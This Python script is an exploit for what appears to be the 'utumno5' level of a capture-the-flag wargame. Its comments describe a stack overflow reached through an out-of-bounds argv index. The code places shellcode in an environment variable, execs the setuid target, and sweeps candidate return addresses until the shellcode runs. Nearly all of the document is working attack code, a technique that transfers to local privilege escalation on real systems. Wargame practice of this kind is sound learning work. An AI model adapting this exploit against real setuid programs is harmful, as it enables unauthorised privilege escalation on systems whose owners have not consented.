import ctypes, os, struct, sys, time

# ---------------------------------------------------------------------------
# utumno5's main() is the same shape as utumno2's:
#
#     if (argc == 1 && argv[0][0] == 0) { ... }   /* the "no arguments" path */
#     printf("Here we go - %s\n", argv[10]);
#     hihi(argv[10]);
#
# and hihi() is:
#
#     if (strlen(p) > 0x13) strncpy(buf, p, 20);   /* only 20 bytes! */
#     else                  strcpy(buf, p);
#
# Two things matter:
#   * argv[10] is past the end of argv when argc == 1, so it aliases envp[8]
#     -- the value of the ninth environment variable (the kernel puts envp
#     right after argv on the initial stack);
#   * the string is longer than 19 bytes, so hihi copies only 20 bytes into
#     its 12-byte buffer.  That is enough to overwrite the saved return
#     address (offset 16), but NOT enough to carry shellcode.  The shellcode
#     therefore stays in the environment string, and the return address
#     points at it.
# ---------------------------------------------------------------------------
libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.execve.argtypes = [ctypes.c_char_p,
                        ctypes.POINTER(ctypes.c_char_p),
                        ctypes.POINTER(ctypes.c_char_p)]

sc = open("/tmp/uu5/sc.bin", "rb").read()
print("shellcode: %d bytes, NUL: %s" % (len(sc), b"\x00" in sc), flush=True)

# The env value is "E08=" + 8 NOPs + 4 filler + ret + NOP sled + shellcode.
# buffer[0..11] = "E08=" + 8 NOPs; buffer[12..15] = filler; buffer[16..19] = ret.
def payload_for(addr):
    return b"E08=" + b"\x90" * 8 + b"B" * 4 + struct.pack("<I", addr) + \
           b"\x90" * 8 + sc

def env_for(p):
    e = [("E%02d" % i).encode() + b"=" + b"A" * 4 for i in range(20)]
    e[8] = p
    return (ctypes.c_char_p * (len(e) + 1))(*e, None)

def run(addr):
    argv = ctypes.cast((ctypes.c_char_p * 2)(b"", None),
                       ctypes.POINTER(ctypes.c_char_p))
    r, w = os.pipe()
    pid = os.fork()
    if pid == 0:
        os.close(r)
        os.dup2(w, 1); os.dup2(w, 2); os.close(w)
        devnull = os.open("/dev/null", os.O_RDONLY); os.dup2(devnull, 0)
        libc.execve(b"/utumno/utumno5", argv, env_for(payload_for(addr)))
        os._exit(1)
    os.close(w)
    out = b""
    end = time.time() + 0.3
    while time.time() < end:
        try:
            chunk = os.read(r, 4096)
        except OSError:
            break
        if not chunk:
            break
        out += chunk
        if b"PWN" in out:
            break
    os.close(r)
    os.waitpid(pid, 0)
    return out

print("sweeping return addresses 0xffffd000..0xffffe800", flush=True)
found = None
for addr in range(0xffffd000, 0xffffe800, 4):
    if 0 in struct.pack("<I", addr):      # the env value is a C string
        continue
    out = run(addr)
    if b"PWN" in out:
        found = addr
        print("HIT at %#x" % addr, flush=True)
        print(out.split(b"PWN!")[1][:40].decode("latin-1"), flush=True)
        break
if found is None:
    print("no address landed on the shellcode")
    sys.exit(1)
